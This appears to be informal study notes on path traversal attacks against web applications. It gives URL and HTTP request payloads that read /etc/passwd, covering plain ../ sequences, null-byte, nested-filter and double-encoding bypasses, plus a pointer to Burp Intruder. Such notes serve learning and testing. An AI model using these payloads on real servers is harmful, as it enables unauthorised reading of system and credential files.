# Path / Directory Traversal

- Sub category of breken access control
- it's allow to access path/locations on the target web server you're not allowed to access

- Find param,images, img tag, file,  api routes accessing files, 
- access linux default like **/etc/passwd** to confrim we have bug

```
https://example.com/?filename=/etc/passwd
```

## Bypassing Absolute Path Restriction
- we can't access file system directly like absolute path(/etc/passwd)
- in this case , using ../ to dynamic path to break

```url
https://example.com/?filename=../etc/passwd
https://example.com/?filename=../../etc/passwd
https://example.com/?filename=../../../etc/passwd
...
``` 

## Bypassing Hard-coded Extensions
- sometime its has extensions check
- %00 - is null byte (it terminate string operation)

```url
https://example.com/?filename=../../../etc/passwd%00.jpg
```

## Bypassing Filtering
- devs adds filters to remove ../


```url
https://example.com/?filename=....//....//....//etc/passwd
```

## Bypassing Hard-coded Paths
- Sometime path contain absoulte path (hard-coded)

```
GET /image?filename=/var/www/images/47.jpg HTTP/1.1
```
Change to
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

## Bypassing Advanced Filtering

- url encoding special characters (/)

```
GET /image?filename=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
```
 it's not working because , server set to url decoding, so double encoing encoded (/)

 ```
 GET /image?filename=..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd HTTP/1.1
 ```

 ## Bypassing Extreme Filtering

 - Using cheat sheet and brupsuite intruder to automatic the process.